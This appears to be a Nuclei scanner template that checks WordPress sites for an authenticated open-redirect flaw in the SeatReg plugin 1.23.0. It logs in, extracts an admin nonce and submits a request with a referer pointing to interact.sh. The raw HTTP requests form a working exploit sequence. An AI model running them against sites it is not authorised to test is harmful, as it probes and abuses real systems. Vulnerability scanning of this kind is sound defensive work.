http:
- extractors:
  - group: 1
    internal: true
    name: seatreg-admin-nonce
    part: body
    regex:
    - '"seatreg\-admin\-nonce" value="([0-9a-z]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_3 == 302
    - contains(header_3, 'http://interact.sh')
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=seatreg-welcome HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-admin/admin-post.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    new-registration-name=test&action=seatreg_create_submit&seatreg-admin-nonce={{seatreg-admin-nonce}}&_wp_http_referer=http://interact.sh&submit=Create+new+registration

    '
id: seatreg-redirect
info:
  author: Mariam Tariq
  description: 'WordPress SeatReg plugin version 1.23.0 suffers from an open redirection
    vulnerability.

    '
  metadata:
    max-request: 3
    verified: true
  name: "WordPress Plugin \u2018SeatReg\u2019 - Open Redirect"
  reference:
  - https://packetstormsecurity.com/files/167888/WordPress-SeatReg-1.23.0-Open-Redirect.html
  severity: medium
  tags: redirect,packetstorm,seatreg,wp-plugin,wp,wordpress,authenticated,vuln
